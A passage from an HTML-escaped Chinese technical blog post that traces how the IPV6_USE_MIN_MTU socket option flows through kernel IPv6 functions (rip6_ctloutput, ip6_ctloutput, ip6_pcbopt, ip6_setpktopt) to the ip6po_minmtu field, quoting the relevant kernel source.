	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_hbh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_hbh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Hop-by-Hop options header */&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Destination options header (before a routing header) */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_dest1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Routing header related info. */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_rhinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_rhinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Destination options header (after a routing header) */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_dest2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_tclass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* traffic class */&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* fragment vs PMTU discovery policy */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define	IP6PO_MINMTU_MCASTONLY	-1 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* default; send at min MTU for multicast */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	IP6PO_MINMTU_DISABLE	 0 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* always perform pmtu disc */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	IP6PO_MINMTU_ALL	 1 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* always send at min MTU */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* whether temporary addresses are preferred as source address */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_prefer_tempaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define	IP6PO_TEMPADDR_SYSTEM	-1 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* follow the system default */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	IP6PO_TEMPADDR_NOTPREFER 0 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* not prefer temporary address */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	IP6PO_TEMPADDR_PREFER	 1 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* prefer temporary address */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#if 0	/* parameters in this block is obsolete. do not reuse the values. */
#define	IP6PO_REACHCONF	0x01	/* upper-layer reachability confirmation. */
#define	IP6PO_MINMTU	0x02	/* use minimum MTU (IPV6_USE_MIN_MTU) */
#endif
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;#define	IP6PO_DONTFRAG		0x04	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* no fragmentation (IPV6_DONTFRAG) */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	IP6PO_USECOA		0x08	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* use care of address */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;无论是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set*()&lt;/code&gt;还是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get*()&lt;/code&gt;，最后都肯定是要通过一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;判断再操作到结构体成员的&lt;/p&gt;

&lt;p&gt;源码搜索&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;，在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_getpcbopt&lt;/code&gt;发现一段符合我们所说特征的代码，可见选项&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;操作的结构体成员是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pktopts-&amp;gt;ip6po_minmtu&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ip6_setpktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sticky&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uproto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP6PO_MINMTU_MCASTONLY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP6PO_MINMTU_DISABLE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP6PO_MINMTU_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 赋值操作&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_setpktopts()&lt;/code&gt;和函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pcbopt()&lt;/code&gt;都调用到了函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_setpktopt()&lt;/code&gt;，但前者的调用逻辑不符合，所以确定调用者是函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pcbopt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ip6_pcbopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uproto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_MALLOC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_IP6OPT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_WAITOK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ENOBUFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ip6_initpktopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6_setpktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uproto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_ctloutput()&lt;/code&gt;里，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;optname&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;的时候调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pcbopt()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ip6_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_exthdrstat_in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOPT_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_TCLASS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_DONTFRAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_PREFER_TEMPADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;optp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_outputopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pcbopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
				    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uproto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip6_ctloutput()&lt;/code&gt;做了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOPT_SET&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOPT_GET&lt;/code&gt;的判断，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;会走&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default&lt;/code&gt;分支调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_ctloutput()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;rip6_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOPT_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOPT_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_CHECKSUM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_raw_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_FLUSH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
